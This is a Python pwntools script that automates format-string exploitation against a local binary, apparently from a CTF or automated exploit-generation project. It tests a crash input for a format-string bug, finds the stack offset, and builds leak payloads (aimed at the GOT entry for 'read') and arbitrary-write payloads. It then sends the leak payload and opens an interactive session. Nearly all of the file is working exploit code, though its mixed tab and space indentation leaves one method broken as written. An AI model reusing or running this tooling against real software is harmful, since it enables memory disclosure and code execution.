from pwn import *
import subprocess
import time
import os
from fmt_attack import *


class FmtPayload:

    def __init__(self,bin_path,crash):
        self.bin_path = bin_path
        self.crash = crash
        # self.offest = 10

    def is_fmt(self):
        if '%' not in self.crash:
            return False
        format_count = self.crash.count('%')
        test = self.crash.replace('%','[%d]')
        f = open(self.bin_path+'test_fmt','wb')
        f.write(test)
        f.close()
        f = open(self.bin_path+'test_fmt')
        proc = subprocess.Popen([self.bin_path],stdin = f,stdout = subprocess.PIPE,stderr=subprocess.STDOUT)
        time.sleep(0.1)
        output = proc.stdout.read()
    #    print output
        test_count = output.count('[%d]')
        proc.kill()
        if test_count == format_count:
            return False
        
        def leak_fmt_addr(payload):
            p = process(self.bin_path)
            #p.interactive()
            p.sendline(payload)
            res = p.recv(4096)
            p.close()
            return res
        try:
            self.offest = FmtStr(leak_fmt_addr).offset
            #print self.offest
        except Exception:
            return False
        # print e
        return True
        # return True
    
    def get_leak_payload(self, leak):
	
        crash_header = self.crash[0:self.crash.index('%')]
	    real_offest = int(len(crash_header)/4 + self.offest + 5)
        payload = (crash_header+'[Result]:%'+str(real_offest)+'$4s').ljust(4*real_offest-24,'a') + p32(leak)
        return payload

    def get_write_payload(self, write_addr, write_value):
        # print self.crash
        # print self.offest
        crash_header = self.crash[0:self.crash.index('%')]
        payload = Payload(self.offest)
        payload.add_write_chunk(write_value,write_addr)
        return crash_header+payload.get_payload()
        

if __name__ == '__main__':
    #print is_fmt(os.getcwd()+'/test','aaaaaaaaa%s%s')
    elf = ELF('./test')
    fmtp = FmtPayload('/home/pzhxbz/Desktop/fmt_test/test','aaaaaa%s%s%s')
    if fmtp.is_fmt():
        payload =  fmtp.get_leak_payload(elf.got['read'])
    p = process('./test')
    print payload
    p.sendline(payload)
	
    p.interactive()
    
    
